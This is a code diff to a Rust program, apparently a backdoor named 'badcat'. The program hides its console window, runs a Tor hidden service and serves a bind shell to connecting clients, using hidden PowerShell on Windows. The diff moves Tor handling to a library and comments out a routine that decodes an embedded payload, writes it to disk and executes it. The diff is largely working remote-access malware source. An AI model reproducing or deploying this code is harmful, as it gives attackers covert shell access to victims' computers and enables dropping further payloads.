@@ -1,16 +1,17 @@
+// hides console window
 #![windows_subsystem = "windows"]
 
 mod config;
 mod setting;
 
-use std::fs::File;
 use std::net::{TcpListener, TcpStream};
 use std::path::PathBuf;
 use std::process::{Child, Command, Stdio};
-use std::{error, fs};
+use std::{error};
 use std::io::{Read, Write};
 
 use badcat_lib::io;
+use tor::Tor;
 
 fn main() -> Result<(), Box<dyn error::Error>> {
     let setting = setting::Setting::new()?;
@@ -46,25 +47,10 @@ fn unbundle_torrc(
     Ok(())
 }
 
-fn executable_name(
+fn start_tor(
+    config: &PathBuf,
     setting: &setting::Setting,
-    parent: Option<&PathBuf>,
-) -> PathBuf {
-    let mut executable = parent.unwrap_or(&setting.tor_dir).join(&setting.name);
-
-    if cfg!(windows) {
-        executable.set_extension("exe");
-    }
-
-    executable
-}
-
-fn start_tor_binary(
-    torrc: &PathBuf,
-    setting: &setting::Setting,
-) -> Result<Child, Box<dyn error::Error>> {
-    let executable = executable_name(setting, None);
-
+) -> Result<Tor, Box<dyn error::Error>> {
     // Fix directory permission - linux build requires this
     if cfg!(unix) || cfg!(macos) {
         let status = Command::new("chmod")
@@ -78,19 +64,9 @@ fn start_tor_binary(
         }
     }
 
-    let log = setting.tor_dir.join("log.txt");
-
-    let stdout: File = File::create(&log)?;
-    let stderr: File = File::create(&log)?;
-
-    let proc = Command::new(executable)
-        .args(["-f", torrc.to_str().unwrap()])
-        .stdin(Stdio::null())
-        .stdout(stdout)
-        .stderr(stderr)
-        .spawn()?;
-
-    Ok(proc)
+    let tor = Tor::new(config);
+    
+    Ok(tor)
 }
 
 fn start_tcp_server(setting: &setting::Setting) -> Result<(), Box<dyn error::Error>> {
@@ -98,10 +74,10 @@ fn start_tcp_server(setting: &setting::Setting) -> Result<(), Box<dyn error::Err
     let port = listener.local_addr()?.port();
     println!("listening at: {:?}", port);
 
-    let torrc = &setting.tor_dir.join("config");
-    unbundle_torrc(&torrc, port, &setting)?;
+    let config = &setting.tor_dir.join("config");
+    unbundle_torrc(&config, port, &setting)?;
 
-    let mut tor_proc = start_tor_binary(&torrc, &setting)?;
+    let tor = start_tor(&config, &setting)?;
     
     let mut payload_proc: Option<Child> = None;
 
@@ -116,9 +92,9 @@ fn start_tcp_server(setting: &setting::Setting) -> Result<(), Box<dyn error::Err
                             });
                         }
 
-                        if let Ok(proc) = execute_payload(setting) {
-                            payload_proc = Some(proc);
-                        }
+                        // if let Ok(proc) = execute_payload(setting) {
+                        //     payload_proc = Some(proc);
+                        // }
                     } else {
                         match bind_shell(stream) {
                             Ok(()) => {}
@@ -131,7 +107,7 @@ fn start_tcp_server(setting: &setting::Setting) -> Result<(), Box<dyn error::Err
         }
     }
 
-    tor_proc.kill()?;
+    tor.stop()?;
 
     Ok(())
 }
@@ -177,6 +153,7 @@ fn bind_shell(stream: TcpStream) -> Result<(), Box<dyn error::Error>> {
     let mut args: Vec<&str> = Vec::new();
 
     let shell = if cfg!(windows) {
+        // used powershell instead of cmd because of hidden console window
         args.extend(["-WindowStyle", "Hidden"]);
         "powershell"
     } else {
@@ -210,26 +187,26 @@ fn bind_shell(stream: TcpStream) -> Result<(), Box<dyn error::Error>> {
     Ok(())
 }
 
-fn execute_payload(
-    setting: &setting::Setting
-) -> Result<Child, Box<dyn error::Error>> {
-    let payload = setting::decode_payload(setting)?;
+// fn execute_payload(
+//     setting: &setting::Setting
+// ) -> Result<Child, Box<dyn error::Error>> {
+//     let payload = setting::decode_payload(setting)?;
 
-    let payload_dir = setting.tor_dir.join("payload");
+//     let payload_dir = setting.tor_dir.join("payload");
 
-    if !payload_dir.exists() {
-        fs::create_dir(&payload_dir)?;
-    }
+//     if !payload_dir.exists() {
+//         fs::create_dir(&payload_dir)?;
+//     }
 
-    let executable = executable_name(setting, Some(&payload_dir));
+//     let executable = executable_name(setting, Some(&payload_dir));
 
-    {
-        let mut file = File::create(&executable)?;
-        file.write(&payload.data)?;
-        file.flush()?;
-    }
+//     {
+//         let mut file = File::create(&executable)?;
+//         file.write(&payload.data)?;
+//         file.flush()?;
+//     }
 
-    let proc = Command::new(executable).spawn()?;
+//     let proc = Command::new(executable).spawn()?;
 
-    Ok(proc)
-}
+//     Ok(proc)
+// }
